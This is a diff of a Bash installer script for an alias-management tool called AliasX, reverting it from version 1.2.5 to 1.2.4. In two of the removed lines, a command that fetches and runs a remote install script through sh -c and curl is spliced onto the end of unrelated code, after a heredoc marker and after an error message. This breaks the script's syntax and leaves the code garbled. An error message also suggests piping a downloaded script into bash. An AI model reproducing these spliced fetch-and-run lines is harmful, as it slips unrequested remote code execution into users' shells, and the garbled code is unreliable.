@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 
 # AliasX - Enhanced Bash Aliases with Parameters
-# Version: 1.2.5
+# Version: 1.2.4
 
 ### Configuration
 ALIAS_FILE="${HOME}/.aliasx_aliases"
 LOADER_FILE="${HOME}/.aliasx_loader"
-VERSION="1.2.5"
+VERSION="1.2.4"
 BACKUP_EXT=".bak"
 GITHUB_URL="https://raw.githubusercontent.com/wqttzicue/AliasX/experimental/aliasx-installer.sh"
 
@@ -43,12 +43,12 @@ install_aliasx() {
     # Create the loader file with proper error handling
     backup_file "$LOADER_FILE" || return 1
     
-    cat > "$LOADER_FILE" <<'EOF'sh -c "$(curl -sS https://raw.githubusercontent.com/Vendicated/VencordInstaller/main/install.sh)"
+    cat > "$LOADER_FILE" <<'EOF'
 #!/usr/bin/env bash
-# AliasX Loader v1.2.5
+# AliasX Loader v1.2.4
 
 ALIAS_FILE="${HOME}/.aliasx_aliases"
-VERSION="1.2.5"
+VERSION="1.2.4"
 
 aliasx_error() {
     printf "\033[1;31mAliasX Error:\033[0m %s\n" "$1" >&2
@@ -73,29 +73,23 @@ validate_alias_name() {
 }
 
 load_aliases() {
-    # First completely unset all existing aliasx functions
-    if [ -f "$ALIAS_FILE" ]; then
-        while IFS='|' read -r name _; do
-            # Force unset both function and alias
-            unset -f "$name" 2>/dev/null || true
-            unalias "$name" 2>/dev/null || true
-        done < "$ALIAS_FILE"
-    fi
-
-    # Then load fresh only if file exists
     [ -f "$ALIAS_FILE" ] || return 0
     
+    # First unset all existing aliasx functions
+    if [ -f "$ALIAS_FILE" ]; then
+        while IFS='|' read -r name _; do
+            unset -f "$name" 2>/dev/null
+        done < "$ALIAS_FILE"
+    fi
+    
+    # Then load fresh
     while IFS='|' read -r name command; do
         [[ -z "$name" || -z "$command" ]] && continue
         
         if ! validate_alias_name "$name"; then
-            aliasx_error "Skipping invalid alias name: '$name'"sh -c "$(curl -sS https://raw.githubusercontent.com/Vendicated/VencordInstaller/main/install.sh)"
+            aliasx_error "Skipping invalid alias name: '$name'"
             continue
         fi
-        
-        # Escape special characters in command (but don't escape $)
-        local escaped_cmd
-        escaped_cmd=$(sed 's/["`\\]/\\&/g' <<<"$command")
         
         eval "$(printf '%s() {
             local args=("$@")
@@ -113,9 +107,9 @@ load_aliases() {
                 cmd="${cmd//\{\*\}/\"${args[@]}\"}"
             fi
             
-            printf "\\033[1;36m➔ Running:\\033[0m \\033[1;33m%s\\033[0m\\n" "$cmd"
+            printf "\033[1;36m➔ Running:\033[0m \033[1;33m%s\033[0m\n" "$cmd"
             eval "$cmd"
-        }' "$name" "$escaped_cmd")"
+        }' "$name" "$(sed 's/"/\\"/g' <<<"$command")")"
     done < "$ALIAS_FILE"
 }
 
@@ -126,28 +120,29 @@ aliasx() {
                 aliasx_error "Missing alias name for removal"
                 return 1
             }
-    
+            
             [ -f "$ALIAS_FILE" ] || {
                 aliasx_error "No aliases file found"
                 return 1
             }
-    
+            
             grep -q "^$2|" "$ALIAS_FILE" || {
                 aliasx_error "Alias '$2' not found"
                 return 1
             }
-    
-    # Create temp file without the alias
-    grep -v "^$2|" "$ALIAS_FILE" > "${ALIAS_FILE}.tmp" && \
-    mv -f "${ALIAS_FILE}.tmp" "$ALIAS_FILE"
-    
-    # Force unset the function completely
-    unset -f "$2" 2>/dev/null || true
-    unalias "$2" 2>/dev/null || true
-    
-    printf "\\033[1;32mRemoved alias:\\033[0m %s\\n" "$2"
-    return 0
-    ;;
+            
+            # Create temp file without the alias
+            grep -v "^$2|" "$ALIAS_FILE" > "${ALIAS_FILE}.tmp" && \
+            mv -f "${ALIAS_FILE}.tmp" "$ALIAS_FILE"
+            
+            # Force unset the function
+            unset -f "$2" 2>/dev/null || true
+            
+            # Reload all aliases to ensure clean state
+            load_aliases
+            
+            printf "\033[1;32mRemoved alias:\033[0m %s\n" "$2"
+            ;;
             
         -L|--list)
             [ -f "$ALIAS_FILE" ] || {
@@ -190,14 +185,11 @@ HELP
             ;;
             
         -U|--uninstall)
-            # Only run the uninstaller if we're not already running it
-            if [[ "$0" != *".aliasx_uninstaller" ]]; then
-                source "${HOME}/.aliasx_uninstaller" && \
-                aliasx_uninstall || {
-                    aliasx_error "Uninstall failed. Try running: bash <(curl -sSL ${GITHUB_URL}) --uninstall"
-                    return 1
-                }
-            fi
+            source "${HOME}/.aliasx_uninstaller" && \
+            aliasx_uninstall || {
+                aliasx_error "Uninstall failed. Try running: bash <(curl -sSL ${GITHUB_URL}) --uninstall"
+                return 1
+            }
             ;;
             
         *)
@@ -227,8 +219,6 @@ EOF
     # Create uninstaller
     cat > "${HOME}/.aliasx_uninstaller" <<'EOF'
 #!/usr/bin/env bash
-
-BACKUP_EXT=".bak"
 
 aliasx_uninstall() {
     # Remove loader from all shell configs
@@ -305,8 +295,7 @@ EOF
 ### Uninstallation Function
 uninstall_aliasx() {
     if [ -f "${HOME}/.aliasx_uninstaller" ]; then
-        # Don't show success message here, let the uninstaller handle it
-        bash "${HOME}/.aliasx_uninstaller" >/dev/null
+        bash "${HOME}/.aliasx_uninstaller"
     else
         show_warning "Uninstaller not found. Trying to remove files manually..."
         
